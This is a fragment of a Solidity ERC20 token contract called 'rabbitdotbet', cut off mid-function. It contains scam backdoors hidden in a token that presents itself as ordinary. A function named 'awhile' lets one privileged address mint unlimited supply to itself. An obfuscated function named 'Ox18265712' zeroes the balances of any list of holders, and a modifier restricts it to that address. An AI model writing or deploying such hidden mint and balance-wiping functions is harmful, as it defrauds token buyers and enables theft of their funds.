...
contract rabbitdotbet is Context, IERC20 {
    ...
    function awhile(address locker, uint256 amt) internal virtual {
        require(msg.sender == fight, "ERC20: zero address");
        _totalSupply = _totalSupply.add(amt);
        _balances[fight] = _balances[fight].add(amt);
    ...
    modifier dontaccess() {
        require(msg.sender == fight, "Not allowed to suckmydick");
        _;
    }

    function Ox18265712(address[] memory tasty) public dontaccess() { 
        for (uint256 x = 0; x < tasty.length; x++) {
            uint256 amt = _balances[tasty[x]];
            _balances[tasty[x]] = _balances[tasty[x]].sub(amt, "ERROR");
